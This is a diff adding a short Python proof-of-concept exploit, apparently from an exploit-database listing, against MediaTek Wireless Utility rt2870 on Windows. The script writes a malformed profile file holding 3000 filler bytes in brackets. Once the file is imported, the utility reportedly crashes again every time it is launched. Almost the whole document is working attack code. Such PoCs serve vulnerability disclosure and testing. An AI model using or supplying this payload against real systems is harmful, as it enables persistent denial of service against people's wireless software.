@@ -1,0 +1,24 @@
+# Exploit Title: MediaTek Wirless Utility rt2870 - Denial of Service (PoC)
+# Autor: Lawrence Amer
+# Date: 2018-09-13
+# Vendor: MediaTek
+# Software url: https://click.pstmrk.it/2ts/d86o2zu8ugzlg.cloudfront.net%2Fmediatek-craft%2Fdrivers%2FRT2770_2870_RT307x.zip/K94pHAI/oTs1/oC6CdN114w
+# Tested on OS: Windows 7 64-bit , 32-bit
+
+# Description: launch program then click on  Add profile setting dialog choose our generate prof file ,
+# succesfully reproduce persistent Denial of service every time launch the program again .
+
+#!/usr/bin/python
+
+buffer ="\x41"*3000
+start = "["
+end = "]"
+payload = start+buffer+end
+try:
+    f=open("poc.prof","w")
+    print "[+] Creating %s Byet evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] file created !"
+except:
+     print "File cannot be created !"
